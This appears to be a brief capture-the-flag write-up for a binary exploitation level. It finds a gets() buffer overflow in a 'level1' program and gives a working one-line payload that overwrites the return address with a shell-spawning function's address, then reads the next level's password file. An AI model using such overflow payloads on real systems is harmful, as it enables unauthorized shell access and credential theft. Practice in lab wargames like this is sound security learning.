Under hopper or ghidra disassembler we see a "run" function
0x08048444 address of the run function running a shell  built-in
Function gets is vulnerable (man gets)
We see a variable with 76 char used by gets
So using a 76char string + "address of run" code will execute run function
Use the following payload:

(python -c 'print "A"*76 + "\x08\x04\x84\x44"[::-1]'; cat -) | ./level1

cd ../level2
cat .pass
